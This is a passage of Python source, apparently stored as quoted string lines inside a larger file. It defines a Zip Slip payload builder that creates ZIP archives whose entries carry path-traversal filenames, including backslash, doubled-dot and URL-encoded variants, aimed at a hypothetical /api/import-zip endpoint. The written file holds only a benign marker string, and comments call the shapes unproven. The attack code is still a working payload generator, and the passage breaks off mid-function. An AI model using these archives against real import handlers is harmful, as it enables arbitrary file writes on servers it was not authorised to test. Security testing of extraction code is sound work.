        "  - Public zip-slip examples classify traversal filenames as the essential",
        "    payload shape.",
        "",
        "This specimen constructs a malformed ZIP archive containing entries with",
        "path-traversal filenames, intended for hypothetical /api/import-zip handling.",
        "\"\"\"",
        "",
        "import io",
        "import zipfile",
        "import argparse",
        "import os",
        "",
        "",
        "class ArchiveTraversalSpecimen:",
        "    \"\"\"Candidate payload builder for archive path traversal baseline.\"\"\"",
        "",
        "    # Candidate traversal patterns drawn from public Zip Slip research.",
        "    # These are speculative shapes; applicability to a specific target is unproven.",
        "    TRAVERSAL_VARIANTS = [",
        "        \"../../..[redacted-path-marker]child_specimen.txt\",",
        "        \"..\\\\..\\\\..\\\\windows\\\\temp\\\\child_specimen.txt\",",
        "        \"....//....//..../[redacted-path-marker]child_specimen.txt\",",
        "        \"..%2f..%2f..%2ftmp%2fchild_specimen.txt\",",
        "    ]",
        "",
        "    def __init__(self, target_filename: str = \"child_specimen.txt\"):",
        "        self.target_filename = target_filename",
        "",
        "    def build_traversal_payload(self, variant_index: int = 0) -> bytes:",
        "        \"\"\"Build a ZIP-shaped payload with a traversal filename entry.",
        "",
        "        Args:",
        "            variant_index: Index into TRAVERSAL_VARIANTS to select a shape.",
        "",
        "        Returns:",
        "            Bytes of a ZIP archive containing one file entry with a traversal",
        "            filename. This is NOT proven to bypass any target validation.",
        "        \"\"\"",
        "        buf = io.BytesIO()",
        "        with zipfile.ZipFile(buf, \"w\", zipfile.ZIP_DEFLATED) as zf:",
        "            traversal_name = self.TRAVERSAL_VARIANTS[",
        "                variant_index % len(self.TRAVERSAL_VARIANTS)",
        "            ]",
        "            # Content is a benign marker; real payload staging is unverified.",
        "            content = b\"BATTLE-004 CHILD SPECIMEN \u2014 UNVERIFIED\"",
        "            zf.writestr(traversal_name, content)",
        "        return buf.getvalue()",
        "",
        "    def build_normalization_variant_payload(self) -> bytes:",
        "        \"\"\"Build a ZIP payload mixing path-separator normalization ideas.",
        "",
        "        Some archive handling APIs normalize backslashes to forward slashes",
        "        or vice versa; this mixes separator styles per the",
        "        child_archive_path_normalization_variants method.",
        "",
        "        Returns:",
        "            Bytes of a ZIP archive with mixed-separator traversal entries.",
        "        \"\"\"",
        "        buf = io.BytesIO()"
